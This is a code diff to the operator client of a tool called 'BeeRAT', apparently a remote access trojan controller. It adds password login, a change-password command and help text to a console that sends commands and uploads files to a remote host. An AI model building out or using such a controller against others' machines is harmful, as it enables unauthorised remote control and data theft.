@@ -55,6 +55,12 @@ class Client:
         return False
 
     def run(self):
+        password = input('Password: ')
+        self.send(password)
+        result = self.recv()
+        if not result:
+            print('[-] Password is incorrect.')
+            self.run()
         while True:
             try:
                 self.send('info')
@@ -86,6 +92,14 @@ class Client:
                         print(self.recv())
                     else:
                         print(f'upload: {file_path}: Not uploadable')
+                elif command[0] == 'change-password':
+                    password = ' '.join(command[1:])
+                    if len(password) >= 8:
+                        self.send(' '.join(command))
+                        if self.recv():
+                            print('[+] Password set successfully.')
+                    else:
+                        print('[-] password must be at least 8 characters long.')
                 else:
                     command = ' '.join(command)
                     self.send(command)
@@ -105,7 +119,7 @@ def main():
         try:
             command = input('BeeRAT-Client$ ').split(' ')
             if command[0] == 'help' and len(command) == 1:
-                print('[+] connect ip')
+                print('Commands:\n\t\thelp\n\t\tclear\n\t\tconnect\n\t\texit\n')
             elif command[0] == 'clear' and len(command) == 1:
                 Client.clear()
             elif command[0] == 'exit' and len(command) == 1:
